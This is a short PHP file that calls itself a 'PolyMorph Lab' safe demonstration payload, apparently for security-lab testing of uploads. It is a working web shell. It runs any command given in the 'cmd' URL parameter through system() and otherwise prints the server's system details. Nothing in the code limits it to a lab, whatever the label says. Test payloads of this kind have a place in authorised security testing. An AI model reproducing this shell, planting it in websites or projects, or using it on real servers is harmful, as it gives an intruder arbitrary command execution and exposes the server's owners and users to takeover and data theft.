<?php
// PolyMorph Lab Payload — Safe Demonstration Payload
echo "POLYMORPH_CMD_EXEC_ACTIVE: ";
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
} else {
    echo php_uname();
}
?>
